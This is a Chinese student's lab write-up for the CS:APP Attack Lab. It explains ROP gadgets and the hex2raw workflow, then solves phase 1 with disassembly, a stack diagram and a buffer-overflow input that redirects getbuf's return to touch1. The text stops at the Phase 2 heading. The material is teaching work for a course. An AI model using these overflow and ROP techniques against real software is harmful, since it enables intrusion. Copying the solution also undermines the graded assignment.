# 从零开始的Attack Lab

> [!CAUTION]
> 
> **本笔记仅供参考，请勿抄袭。**

## 声明
本笔记的写作初衷在于，笔者在做Attack Lab的时候受到Arthals学长很大启发，同时25Fall的计算机系统导论课程改制增加了10分的Lab测试（虽然往年的期中期末中也会有一两道Lab相关选择题，但分值不大）。故将心路历程写成此笔记，以便复习，并供后续选课同学参考。

## Attack Lab简要介绍
Attack Lab是《计算机系统导论》课程的第3个Lab，对应教材第三章《程序的机器级表示》。该Lab旨在加深同学们对缓冲区攻击和防护的理解，以及进一步加强汇编代码阅读能力以及GDB调试工具的运用。

在Attack Lab中，需要完成6次攻击(即phase 1 $\sim$ phase 6)，主要思路是通过向缓冲区输入相关字符串，来引导程序跳转至程序规定的函数(即``touch1、touch2和touch3``)，并完成相关要求。同时，对于下载的每个``target x``包，系统都会发放不同的``cookie.txt``作为攻击依据。与``Bomb Lab``不同，错误发起攻击将不会受到任何~~处分~~惩罚。

上述六个``phase``共分为三个``level``，其中phase 1 $\sim$ phase 3归为``level 1``，需要对``ctarget``发起攻击，基本思路是进行代码注入(CI)攻击。phase 4 $\sim$ phase 5归为``level 2``，需要对``rtarget``发起攻击，基本思路是进行返回导向编程(ROP)攻击。phase 6归为``level 3``，需要对``starget``发起攻击，基本思路也是进行返回导向编程(ROP)攻击，但是攻击对象本身具有金丝雀保护。另外，进行ROP攻击的三个phase都有gadget(含义下面会阐述)限制。

值得一提的是，phase 1 $\sim$ phase 4的总分为90分，而phase 5和phase 6都为5分(事实上，原生Lab并不存在phase 6，其为PKU魔改)。因此，如果时间实在紧迫，可以仅做完phase 1 $\sim$ phase 4，以获取大部分分数。这个Lab的难度大致为中低，笔者耗时大概为6 $\sim$ 7小时。

## 在动手之前
### GDB常用指令&美化
- 见笔者的上篇博文[elainafan-从零开始的Bomb Lab](https://github.com/elainafan/Introduction-to-Computer-Systems-2025Fall-PKU/blob/main/02%20Bomb%20Lab/README.md)
### 何为ROP攻击？
ROP攻击，全称 **Return-oriented Programming Attack**，即不注入任何攻击代码，完全按照执行现有代码来进行攻击。用人话说，就是"断章取义"。

其策略是在现有程序中识别由一条或多条指令后接``ret``指令组成的字节序列，这样的序列被称为``gadget``。以下列代码为例：

```
0000000000400f15 <setval_210>:
400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
400f1b: c3 retq
```

其看上去人畜无害，但是可以从二进制编码中提取出``48 89 c7 c3``这个序列，在二进制编码中，其含义为``movq %rax,%rdi ret``，此时含义完全发生了变化！

在攻击时，只需要向缓冲区输入gadget的地址，就可以调用相对的gadget，调动程序进行完全不同的操作，这就是ROP攻击。

下列是常见的gadget二进制代码：

![movq的二进制代码](./Picture%20Assets/1.png)

![popq的二进制代码](./Picture%20Assets/2.png)

![movl的二进制代码](./Picture%20Assets/3.png)

![常用计算操作的二进制代码](./Picture%20Assets/4.png)

笔者需要提醒的是，与前三个表格不同，第四个表格与``90(nop)``一样，通常用于在攻击gadget之间充当无意义语句。

同时，不要忘记，``movl``会将目的数的高32位置零。

### 如何发起攻击？
如上文所述，在Attack Lab中，攻击分为两种形式：CI攻击和ROP攻击。

但是无论是哪种攻击形式，都需要编写相关的输入字符串，然后将字符串根据十六进制``ASCII``码翻译为真实二进制输入数据流，再运行程序，让它从二进制文件中读取输入数据。

以下列代码为例：

```
./hex2raw < p1.txt > ans1.txt # p1.txt是编写的写有十六进制的文件，将其转为二进制文件ans1.txt
./ctarget -i ans1.txt # 运行ctarget，让它从ans1.txt中读取输入
```

在这之外，ROP攻击还多了几步，需要先编辑好想进行攻击的汇编代码，再将其转化为十六进制编码gadget，找出gadget地址，将它编写进十六进制文件。

以下列代码为例：
```
gcc -c p5.s && objdump -d p5.o > p5.byte # 将p5.s编译并反汇编为p5.byte文件(带十六进制编码的汇编码文件)
```

### 正则表达式搜索
在ROP攻击的三个phase中，找到合适的garget是件大体力活，掌握正则表达式搜索可以使工作效率事半功倍。

笔者在做之前也不会，建议询问AI或者查阅相关资料，笔者将在下面的phase中边做边讲解需要使用的正则表达式。
### 课本相关知识
- 汇编代码的相关含义
- 缓冲区溢出的攻击原理及其防护方式
- GDB调试工具的使用
## 开始动手！
### Phase 1
首先，运行下列指令，对``ctarget``进行反汇编，得到其汇编码文件:

```
objdump -d ctarget > ctarget.s
```

根据``writeup``，需要让``ctarget``文件在执行其``return``语句时执行``touch1``的代码，而不是返回到``test``。

先阅读``test``函数的代码：

```
0000000000401f06 <test>:
  401f06:	f3 0f 1e fa          	endbr64 # 防ROP攻击
  401f0a:	48 83 ec 08          	sub    $0x8,%rsp # 分配8字节空间
  401f0e:	b8 00 00 00 00       	mov    $0x0,%eax # 将%eax置为0
  401f13:	e8 92 fd ff ff       	call   401caa <getbuf> # 调用getbuf函数
  401f18:	89 c2                	mov    %eax,%edx # 将getbuf的结果赋给%edx
  401f1a:	48 8d 35 d7 22 00 00 	lea    0x22d7(%rip),%rsi        # 4041f8 <_IO_stdin_used+0x1f8> # 取出字符串给%rsi
  401f21:	bf 02 00 00 00       	mov    $0x2,%edi # %edi=2
  401f26:	b8 00 00 00 00       	mov    $0x0,%eax # %eax=0
  401f2b:	e8 60 f2 ff ff       	call   401190 <__printf_chk@plt> # 调用printf函数
  401f30:	48 83 c4 08          	add    $0x8,%rsp # 释放空间
  401f34:	c3                   	ret
```

再查阅``getbuf``函数的代码：

```
0000000000401caa <getbuf>:
  401caa:	f3 0f 1e fa          	endbr64
  401cae:	48 83 ec 28          	sub    $0x28,%rsp # 分配40字节空间
  401cb2:	48 89 e7             	mov    %rsp,%rdi # 把%rsp赋给%rdi 
  401cb5:	e8 57 03 00 00       	call   402011 <Gets> # 调用gets
  401cba:	b8 01 00 00 00       	mov    $0x1,%eax # 将$eax置为1
  401cbf:	48 83 c4 28          	add    $0x28,%rsp # 释放空间
  401cc3:	c3                   	ret 
```

由课本3.10.3节的以下内容，可以简单判断出栈的结构：

![](./Picture%20Assets/5.png)

即我们栈的结构为

```
--------------- 64
| test返回地址 |
--------------- 56
| test开的空间 |
--------------- 48 
|  返回地址    |
--------------- 40
|  缓冲区输入  |
--------------- 0 <-- %rsp
```

因此，由于原函数使用的是``gets``函数，只需要让缓冲区溢出，并且覆盖``getbuf``的返回地址，使其跳转到``touch1``即可。

找到``touch1``的地址为``0x401d36``，于是有答案为

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
36 1d 40 00 00 00 00 00 # 注意小端法存储
```

新建``p1.txt``文件，将上述答案写入，打开终端，运行以下指令：

```
./hex2raw < p1.txt > ans1.txt
./ctarget -i ans1.txt
```

得到以下输出，表示已经完成了``phase 1``：

![](./Picture%20Assets/6.png)

### Phase 2